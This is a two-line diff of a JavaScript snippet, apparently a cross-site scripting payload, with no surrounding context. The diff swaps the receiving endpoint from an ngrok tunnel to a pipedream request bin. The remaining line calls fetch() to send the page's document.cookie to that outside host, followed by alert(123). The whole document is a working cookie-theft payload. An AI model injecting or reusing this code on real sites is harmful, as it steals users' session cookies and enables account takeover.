@@ -1,2 +1,2 @@
-fetch('https://83ab-141-179-2-17.ngrok-free.app/?'+document.cookie);
+fetch('https://en8cry6tc6ggh.x.pipedream.net/?'+document.cookie);
 alert(123)
